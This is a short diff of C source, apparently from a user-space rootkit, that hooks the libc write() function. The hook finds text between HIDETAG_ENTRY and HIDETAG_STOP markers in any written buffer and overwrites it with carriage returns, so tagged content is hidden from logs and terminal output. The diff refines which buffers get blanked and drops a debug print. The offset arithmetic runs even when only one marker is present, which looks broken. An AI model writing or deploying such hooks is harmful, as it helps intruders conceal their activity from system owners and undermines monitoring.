@@ -91,19 +91,17 @@ ssize_t write(int fd, const void *buf, size_t count){
 	}
 	p1 = strstr((char*)buf, HIDETAG_ENTRY);
 	p2 = strstr((char*)buf, HIDETAG_STOP);
-
 	if(p1 || p2){
-		int start_str = p1 - (char*)buf - 2;
-		int final_str = p2 - (char*)buf + strlen(HIDETAG_STOP) + 2;
+		if(!is_heap_var((void*)buf)){
 
-		for(i = start_str; i < final_str; i++){
-			((char*)buf)[i] = '\r';
+			int start_str = p1 - (char*)buf - 2;
+			int final_str = p2 - (char*)buf + strlen(HIDETAG_STOP) + 2;
+
+			for(i = start_str; i < final_str; i++){
+				((char*)buf)[i] = '\r';
+			}
 		}
 	};
-	if(is_heap_var((void*)buf)){
-		printf("VALUE :: %s %p\n", buf, (void*)buf); // issues, zeroing the data
-		buf = 0;
-	}
 	ssize_t ret = original_write(fd, buf, count);
 	return ret;
 }
